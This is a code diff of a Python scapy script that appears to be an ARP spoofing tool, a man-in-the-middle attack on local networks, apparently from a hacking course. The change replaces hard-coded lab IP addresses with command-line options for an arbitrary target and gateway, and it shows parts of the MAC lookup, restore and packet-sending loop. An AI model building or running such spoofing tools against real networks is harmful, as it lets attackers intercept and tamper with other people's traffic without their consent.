@@ -3,10 +3,19 @@
 import scapy.all as scapy
 import time
 import sys
+import argparse
 
-target_ip = "10.0.2.15"
-target_mac = "08:00:27:70:92:1d"
-gateway_ip = "10.0.2.1"
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target_ip", help="Target device IP.")
+    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP.")
+    options = parser.parse_args()
+    if not options.target_ip:
+        parser.error("[-] Please specify an IP for the target device. Use --help for more info.")
+    elif not options.gateway_ip:
+        parser.error("[-] Please specify an IP for the gateway. Use --help for more info.")
+    return options
 
 
 def get_mac(ip):
@@ -36,6 +45,9 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, verbose=False, count=4)
 
 
+ips = get_arguments()
+target_ip = ips.target_ip
+gateway_ip = ips.gateway_ip
 sent_packets_count = 0
 try:
     while True:
